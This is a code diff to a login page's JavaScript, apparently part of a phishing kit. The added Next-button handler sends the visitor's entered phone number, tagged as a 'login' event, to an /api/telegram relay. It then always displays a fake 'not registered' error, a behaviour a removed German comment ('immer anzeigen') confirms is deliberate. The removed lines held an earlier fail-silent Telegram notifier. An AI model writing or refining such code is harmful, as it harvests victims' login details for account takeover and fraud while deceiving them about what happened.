@@ -337,25 +337,24 @@ phone.addEventListener("input", ()=>{
   setError(false);
   triedSubmit = false;
 });
-async function notifyTelegram(payload) {
-  try {
-    await fetch("/api/notify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-  } catch (e) {
-    // still fail-silent
-  }
-}
 
-nextBtn.addEventListener("click", () => {
-  const L = LANGS[current];
-  const digits = (phone.value || "").replace(/\D/g,"");
-  if(digits.length < 7) return;
+
+nextBtn.addEventListener("click", async () => {
+  const digits = (phone.value || "").replace(/\D/g, "");
+  if (digits.length < 7) return;
+
+  await fetch("/api/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      event: "login",
+      phone: digits,
+      lang: current
+    })
+  });
 
   triedSubmit = true;
-  setError(true, L.notRegistered); // immer anzeigen
+  setError(true, LANGS[current].notRegistered);
 });
 
 createBtn.addEventListener("click", () => {
